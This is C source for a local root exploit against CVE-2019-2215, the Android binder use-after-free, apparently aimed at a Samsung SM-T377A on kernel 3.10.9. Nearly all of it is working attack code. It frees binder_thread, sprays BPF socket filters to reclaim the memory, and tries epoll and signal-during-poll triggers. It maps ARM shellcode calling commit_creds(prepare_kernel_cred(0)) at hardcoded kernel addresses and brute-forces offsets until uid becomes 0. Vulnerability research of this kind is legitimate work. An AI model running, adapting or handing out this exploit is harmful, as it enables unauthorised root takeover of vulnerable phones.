/*
 * cve_2019_2215_multi.c — Novel CVE-2019-2215 exploitation via multi-epoll + signal trigger
 *
 * BREAKTHROUGH APPROACH #1: Multi-epoll non-self-referential write
 *   With 2 epolls monitoring binder, the wait queue has 2 entries.
 *   When we free binder_thread and spray BPF, then close(epfd1):
 *   list_del writes KERNEL ADDRESSES into our BPF data.
 *   This corrupts BPF instructions → detectable via filter behavior.
 *   We can then re-spray with controlled values and close(epfd2)
 *   for a more useful write.
 *
 * BREAKTHROUGH APPROACH #2: Signal-handler-during-poll trigger
 *   Instead of close(epfd) as trigger, use poll() + signal:
 *   - Thread calls poll(binder_fd) → poll_wait links stack entry into thread->wait
 *   - Signal handler runs BINDER_THREAD_EXIT → frees binder_thread
 *   - BPF spray in signal handler → reclaims freed k256
 *   - Signal handler returns → poll_freewait runs
 *   - remove_wait_queue reads next/prev from BPF data as HEAD pointers
 *   - list_del uses BPF data values as addresses → CONTROLLED WRITE!
 *
 *   KEY DIFFERENCE: poll's wait entry has next=head, prev=head (was only entry).
 *   After spray, head->task_list is our BPF data. list_del reads:
 *     next = entry->next (saved pointer to head = BPF_data + W + 4)
 *     prev = entry->prev (saved pointer to head = BPF_data + W + 4)
 *   BUT head's task_list was OVERWRITTEN by BPF data! And the remove_wait_queue
 *   first does spin_lock on head->lock (BPF_data + W), then:
 *     __remove_wait_queue → list_del(&entry->task_list)
 *   which writes BPF_data + W + 4 into itself. STILL SELF-REFERENTIAL for 1 entry.
 *
 *   HOWEVER: what if we do poll() from 2 threads on the same binder fd?
 *   Each poll creates its own poll_table_entry, both linked into the SAME
 *   binder_thread->wait. With 2 entries, list_del of the first entry
 *   writes the second entry's address. We control what the HEAD contains
 *   via BPF spray!
 *
 * APPROACH #3: epoll_wait-based trigger
 *   epoll_wait calls ep_poll which calls ep_events_available/ep_scan_ready_list.
 *   If we can make the binder fd appear "ready" (via a transaction from another
 *   process), epoll_wait processes events through the freed/reclaimed memory.
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o cve_2019_2215_multi cve_2019_2215_multi.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0

#define NUM_SPRAY 200
#define BPF_INSNS 26  /* 26 insns → ~228 bytes → kmalloc-256 */

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name))
            { val = a; break; }
    }
    fclose(f);
    return val;
}

/* ========== BPF spray helpers ========== */

/* Create BPF filter: all NOP loads + final RET 0xFFFF (accept all) */
static struct sock_fprog make_canary_bpf(void) {
    static struct sock_filter insns[BPF_INSNS];
    /* Fill with easily-detectable pattern:
     * Each insn: code=0x0000 (BPF_LD|BPF_W|BPF_ABS), jt=0x41, jf=0x41, k=0x41414141
     * This loads from packet offset 0x41414141, which fails → returns 0
     * But we're interested in whether these bytes get OVERWRITTEN */
    for (int i = 0; i < BPF_INSNS - 1; i++) {
        insns[i] = (struct sock_filter){ BPF_LD | BPF_W | BPF_ABS, 0, 0, 0 };
    }
    /* Last must be BPF_RET or the verifier rejects */
    insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
    return (struct sock_fprog){ .len = BPF_INSNS, .filter = insns };
}

/* Create BPF filter with specific 4-byte values at byte offsets in the k256 block.
 * sk_filter layout: refcnt(4) + len(4) + rcu(8) + bpf_func(4) = 20 bytes header.
 * BPF insns start at byte 20. Each insn is 8 bytes.
 * To write a 32-bit value V at byte offset O (O >= 20):
 *   insn_idx = (O - 20) / 8
 *   field_off = (O - 20) % 8
 *   field_off 0-1: code (u16), 2: jt (u8), 3: jf (u8), 4-7: k (u32)
 */
static void set_u32_at_offset(struct sock_filter *insns, int ninsns,
                               int byte_offset, uint32_t value) {
    if (byte_offset < 20) return;  /* Can't control header */
    int insn_off = byte_offset - 20;
    int insn_idx = insn_off / 8;
    int field_off = insn_off % 8;
    if (insn_idx >= ninsns) return;

    /* Write value into the instruction's raw bytes */
    uint8_t *raw = (uint8_t *)&insns[insn_idx];
    if (field_off + 4 <= 8) {
        *(uint32_t *)(raw + field_off) = value;
    } else {
        /* Spans two instructions */
        int first_bytes = 8 - field_off;
        memcpy(raw + field_off, &value, first_bytes);
        if (insn_idx + 1 < ninsns) {
            uint8_t *raw2 = (uint8_t *)&insns[insn_idx + 1];
            memcpy(raw2, ((uint8_t *)&value) + first_bytes, 4 - first_bytes);
        }
    }
}

/* ========== Shellcode setup (no KASLR, no PXN) ========== */

static void *setup_shellcode(void) {
    void *page = mmap((void*)0x42000000, 4096,
                      PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (page == MAP_FAILED) return NULL;

    /* ARM32 shellcode: commit_creds(prepare_kernel_cred(0)) */
    uint32_t sc[] = {
        0xe92d4010,  /* push {r4, lr} */
        0xe3a00000,  /* mov r0, #0 */
        0xe59f4010,  /* ldr r4, [pc, #16] → prepare_kernel_cred */
        0xe12fff34,  /* blx r4 */
        0xe59f4008,  /* ldr r4, [pc, #8] → commit_creds */
        0xe12fff34,  /* blx r4 */
        0xe3a00000,  /* mov r0, #0 */
        0xe8bd8010,  /* pop {r4, pc} */
        PREPARE_KERNEL_CRED,
        COMMIT_CREDS,
    };
    memcpy(page, sc, sizeof(sc));

    /* Fake wait_queue_entry at 0x42000200 */
    uint32_t *fake = (uint32_t*)((char*)page + 0x200);
    fake[0] = 0;                     /* flags */
    fake[1] = 0;                     /* private */
    fake[2] = 0x42000000;            /* func → shellcode */
    fake[3] = (uint32_t)&fake[3];    /* task_list.next → self */
    fake[4] = (uint32_t)&fake[3];    /* task_list.prev → self */

    return page;
}

/* ========== TEST 1: Multi-epoll write detection ========== */

static void test_multi_epoll_write(void) {
    printf("=== TEST 1: Multi-epoll write primitive detection ===\n");
    printf("  Using 2 epolls → 2 wait entries → list_del should write\n");
    printf("  kernel addresses into BPF data (corrupting instructions)\n\n");

    int crashes = 0;
    int corruptions = 0;

    for (int trial = 0; trial < 30; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);

            cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
            sched_setaffinity(0, sizeof(cs), &cs);

            /* Open binder */
            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0;
            ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* Create 2 epolls monitoring binder → 2 eppoll_entries in wait queue */
            int epfd1 = epoll_create1(0);
            int epfd2 = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);
            epoll_ctl(epfd2, EPOLL_CTL_ADD, bfd, &ev);

            /* FREE binder_thread → UAF */
            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* SPRAY: BPF filters with known pattern */
            int spray_socks[NUM_SPRAY];
            struct sock_fprog prog = make_canary_bpf();
            int sprayed = 0;
            for (int i = 0; i < NUM_SPRAY; i++) {
                spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (spray_socks[i] < 0) break;
                if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &prog, sizeof(prog)) < 0) {
                    close(spray_socks[i]);
                    break;
                }
                sprayed++;
            }

            /* TRIGGER: close epfd1 → list_del on entry1 */
            /* This should write entry2's kernel address into BPF data */
            close(epfd1);

            /* DETECT: try to use each BPF filter. If the instruction was
             * corrupted, the filter might crash or behave differently. */
            int sv[2];
            socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
            char test_pkt[32] = "AAAAAAAAAAAAAAAA";

            for (int i = 0; i < sprayed; i++) {
                /* Detach old filter, re-check if socket works */
                /* Actually, we can't read BPF data back. But if the filter
                 * was corrupted, the sk_filter might have invalid bpf_func
                 * or bad instructions. Closing the socket calls
                 * sk_filter_uncharge which accesses the filter. */
            }

            /* Safer detection: close all spray sockets. If any sk_filter
             * was corrupted (e.g., refcount or rcu_head), close might crash. */
            for (int i = 0; i < sprayed; i++) close(spray_socks[i]);

            /* Now close epfd2 */
            close(epfd2);

            close(bfd);
            close(sv[0]); close(sv[1]);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("  [%d] *** CRASH sig=%d — WRITE PRIMITIVE HIT! ***\n",
                   trial, WTERMSIG(status));
            crashes++;
        }

        if ((trial + 1) % 10 == 0) {
            printf("  [%d/%d] crashes=%d\n", trial + 1, 30, crashes);
            fflush(stdout);
        }
    }

    printf("  Result: %d crashes in 30 trials\n\n", crashes);
    if (crashes > 0) {
        printf("  *** WRITE PRIMITIVE CONFIRMED! BPF data corrupted by list_del! ***\n\n");
    }
}

/* ========== TEST 2: Signal-during-poll trigger ========== */

static int sig_binder_fd = -1;
static int sig_spray_done = 0;

static void sighandler_thread_exit(int sig) {
    if (sig_binder_fd >= 0) {
        /* Free binder_thread while poll() is using it */
        int32_t dummy = 0;
        ioctl(sig_binder_fd, BINDER_THREAD_EXIT, &dummy);

        /* Quick spray inside signal handler */
        struct sock_filter insns[BPF_INSNS];
        for (int i = 0; i < BPF_INSNS - 1; i++)
            insns[i] = (struct sock_filter){ BPF_LD | BPF_W | BPF_ABS, 0, 0, 0 };
        insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
        struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };

        for (int i = 0; i < 100; i++) {
            int sk = socket(AF_INET, SOCK_DGRAM, 0);
            if (sk >= 0) {
                setsockopt(sk, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
                /* Don't close — keep for spray */
            }
        }
        sig_spray_done = 1;
    }
}

static void test_signal_poll_trigger(void) {
    printf("=== TEST 2: Signal-handler-during-poll trigger ===\n");
    printf("  BINDER_THREAD_EXIT from signal handler while poll() active\n\n");

    int crashes = 0;

    for (int trial = 0; trial < 20; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);

            cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
            sched_setaffinity(0, sizeof(cs), &cs);

            /* Open binder */
            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0;
            ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            sig_binder_fd = bfd;
            sig_spray_done = 0;

            /* Install signal handler */
            struct sigaction sa;
            memset(&sa, 0, sizeof(sa));
            sa.sa_handler = sighandler_thread_exit;
            sa.sa_flags = SA_NODEFER;
            sigaction(SIGUSR1, &sa, NULL);

            /* Create alarm to send us SIGUSR1 during poll */
            pid_t child = fork();
            if (child == 0) {
                usleep(50000); /* 50ms — let parent enter poll */
                kill(getppid(), SIGUSR1);
                _exit(0);
            }

            /* Enter poll on binder — this links a poll_table_entry
             * into binder_thread->wait on the kernel stack */
            struct pollfd pfd = { .fd = bfd, .events = POLLIN };
            int ret = poll(&pfd, 1, 200); /* 200ms timeout */

            /* If we get here without crashing, check if the signal handler ran */
            int status;
            waitpid(child, &status, 0);

            /* poll_freewait runs here → remove_wait_queue on freed/sprayed memory */
            /* If the spray reclaimed the slot, list_del reads from BPF data! */

            close(bfd);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("  [%d] *** CRASH sig=%d — SIGNAL TRIGGER HIT! ***\n",
                   trial, WTERMSIG(status));
            crashes++;
        }
    }

    printf("  Result: %d crashes in 20 trials\n\n", crashes);
    if (crashes > 0) {
        printf("  *** SIGNAL TRIGGER WORKS! poll_freewait used freed/sprayed data! ***\n\n");
    }
}

/* ========== TEST 3: Multi-epoll with slab delta monitoring ========== */

static void test_multi_epoll_slab(void) {
    printf("=== TEST 3: Multi-epoll UAF slab delta analysis ===\n");

    int total_k256_delta = 0;
    int anomalies = 0;

    for (int trial = 0; trial < 50; trial++) {
        int k256_before = get_slab("kmalloc-256");

        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0;
            ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* 3 epolls */
            int epfd1 = epoll_create1(0);
            int epfd2 = epoll_create1(0);
            int epfd3 = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);
            epoll_ctl(epfd2, EPOLL_CTL_ADD, bfd, &ev);
            epoll_ctl(epfd3, EPOLL_CTL_ADD, bfd, &ev);

            /* UAF */
            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* Spray */
            int spray_socks[NUM_SPRAY];
            struct sock_fprog prog = make_canary_bpf();
            int sprayed = 0;
            for (int i = 0; i < NUM_SPRAY; i++) {
                spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (spray_socks[i] < 0) break;
                if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &prog, sizeof(prog)) == 0)
                    sprayed++;
                else { close(spray_socks[i]); break; }
            }

            /* Close epolls in order: 1, 2, 3 */
            close(epfd1);
            close(epfd2);
            close(epfd3);

            for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
            close(bfd);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);

        usleep(50000);
        int k256_after = get_slab("kmalloc-256");
        int delta = k256_after - k256_before;
        total_k256_delta += delta;

        if (WIFSIGNALED(status)) {
            printf("  [%d] CRASH sig=%d k256=%+d\n", trial, WTERMSIG(status), delta);
            anomalies++;
        } else if (delta > 5 || delta < -5) {
            anomalies++;
        }
    }

    printf("  Total k256 delta: %+d over 50 trials\n", total_k256_delta);
    printf("  Anomalies: %d/50\n\n", anomalies);
}

/* ========== TEST 4: Concurrent poll from 2 threads + signal ========== */

static int t4_binder_fd = -1;
static volatile int t4_threads_in_poll = 0;

static void t4_sighandler(int sig) {
    if (t4_binder_fd >= 0) {
        int32_t dummy = 0;
        ioctl(t4_binder_fd, BINDER_THREAD_EXIT, &dummy);
    }
}

static void *t4_poll_thread(void *arg) {
    struct pollfd pfd = { .fd = t4_binder_fd, .events = POLLIN };
    __sync_fetch_and_add(&t4_threads_in_poll, 1);
    poll(&pfd, 1, 500);
    return NULL;
}

static void test_dual_poll_signal(void) {
    printf("=== TEST 4: Dual thread poll + signal trigger ===\n");
    printf("  2 threads in poll() → 2 wait entries → signal frees thread\n\n");

    int crashes = 0;

    for (int trial = 0; trial < 30; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);

            cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
            sched_setaffinity(0, sizeof(cs), &cs);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0;
            ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            t4_binder_fd = bfd;
            t4_threads_in_poll = 0;

            /* Signal handler frees binder_thread */
            struct sigaction sa;
            memset(&sa, 0, sizeof(sa));
            sa.sa_handler = t4_sighandler;
            sigaction(SIGUSR1, &sa, NULL);

            /* IMPORTANT: call a binder ioctl first to create the binder_thread
             * for THIS process (pid). The poll threads will create their own. */
            /* Actually, we want to free the MAIN thread's binder_thread.
             * But BINDER_THREAD_EXIT frees current's thread.
             * In the signal handler, current = the thread that received the signal.
             * We need to send SIGUSR1 to a thread that's in poll(). */

            /* Revised approach: thread does poll on binder, gets signal,
             * signal handler frees THAT thread's binder_thread */
            pthread_t t1, t2;
            pthread_create(&t1, NULL, t4_poll_thread, NULL);
            pthread_create(&t2, NULL, t4_poll_thread, NULL);

            /* Wait for threads to enter poll */
            while (t4_threads_in_poll < 2) usleep(1000);
            usleep(50000);

            /* Spray BPF */
            int spray_socks[NUM_SPRAY];
            struct sock_fprog prog = make_canary_bpf();
            int sprayed = 0;
            for (int i = 0; i < 50; i++) {
                spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (spray_socks[i] >= 0 &&
                    setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &prog, sizeof(prog)) == 0)
                    sprayed++;
            }

            /* Send signal to thread 1 — this thread's signal handler
             * frees its binder_thread while it's in poll() */
            pthread_kill(t1, SIGUSR1);
            usleep(10000);

            /* Thread 1 returns from poll. poll_freewait runs on the
             * freed/sprayed binder_thread memory. */
            pthread_join(t1, NULL);
            pthread_join(t2, NULL);

            for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
            close(bfd);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("  [%d] *** CRASH sig=%d ***\n", trial, WTERMSIG(status));
            crashes++;
        }

        if ((trial + 1) % 10 == 0) {
            printf("  [%d/%d] crashes=%d\n", trial + 1, 30, crashes);
            fflush(stdout);
        }
    }

    printf("  Result: %d crashes in 30 trials\n\n", crashes);
}

/* ========== TEST 5: Attempt actual exploitation with offset brute-force ========== */

static int try_exploit_multi(int wait_off) {
    void *sc = setup_shellcode();
    if (!sc) return -1;

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    /* Open binder */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) return -1;
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
    uint32_t z = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

    /* 2 epolls for non-self-referential write */
    int epfd1 = epoll_create1(0);
    int epfd2 = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);
    epoll_ctl(epfd2, EPOLL_CTL_ADD, bfd, &ev);

    /* UAF */
    int32_t dummy = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

    /* Spray BPF with payload at wait_off */
    /* wait_queue_head: lock(4) + task_list.next(4) + task_list.prev(4) */
    struct sock_filter insns[BPF_INSNS];
    for (int i = 0; i < BPF_INSNS - 1; i++)
        insns[i] = (struct sock_filter){ BPF_LD | BPF_W | BPF_ABS, 0, 0, 0 };
    insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };

    /* Set lock = 0 (unlocked) */
    set_u32_at_offset(insns, BPF_INSNS, wait_off, 0x00000000);
    /* Set task_list.next → fake wait entry at 0x42000200 */
    set_u32_at_offset(insns, BPF_INSNS, wait_off + 4, 0x42000200 + 12);
    /* Set task_list.prev → fake wait entry at 0x42000200 */
    set_u32_at_offset(insns, BPF_INSNS, wait_off + 8, 0x42000200 + 12);

    struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };

    int spray_socks[NUM_SPRAY];
    int sprayed = 0;
    for (int i = 0; i < NUM_SPRAY; i++) {
        spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_socks[i] < 0) break;
        if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                      &prog, sizeof(prog)) == 0)
            sprayed++;
        else { close(spray_socks[i]); break; }
    }

    uid_t before = getuid();

    /* TRIGGER: close epfd1, then epfd2 */
    close(epfd1);
    close(epfd2);

    uid_t after = getuid();

    if (after == 0) {
        printf("*** ROOT! uid=%d→%d ***\n", before, after);
        for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
        close(bfd);
        system("id");
        return 0;
    }

    for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
    close(bfd);
    munmap(sc, 4096);
    return -1;
}

static void test_exploit_bruteforce(void) {
    printf("=== TEST 5: Multi-epoll exploit offset brute-force ===\n");

    setup_shellcode();

    /* Try offsets 20-220 in steps of 4 */
    for (int off = 20; off <= 220; off += 4) {
        printf("  [off=%d] ", off);
        fflush(stdout);

        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int r = try_exploit_multi(off);
            _exit(r == 0 ? 42 : 0);
        }

        int status;
        waitpid(pid, &status, 0);

        if (WIFEXITED(status)) {
            if (WEXITSTATUS(status) == 42) {
                printf("*** ROOT! offset=%d ***\n", off);
                try_exploit_multi(off);
                return;
            }
            printf("clean\n");
        } else if (WIFSIGNALED(status)) {
            printf("*** CRASH sig=%d — UAF HIT! ***\n", WTERMSIG(status));
        }
    }

    printf("\n");
}

int main(void) {
    printf("=== CVE-2019-2215 Novel Exploitation ===\n");
    printf("SM-T377A kernel 3.10.9, patch 2017-07\n");
    printf("Multi-epoll + Signal trigger approaches\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    alarm(600);

    test_multi_epoll_write();
    test_signal_poll_trigger();
    test_multi_epoll_slab();
    test_dual_poll_signal();
    test_exploit_bruteforce();

    printf("--- dmesg ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -30 | grep -iE "
           "'oops|bug|panic|fault|corrupt|Backtrace|Unable|PC.is|"
           "binder|epoll|WARNING|list_del|use.after' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
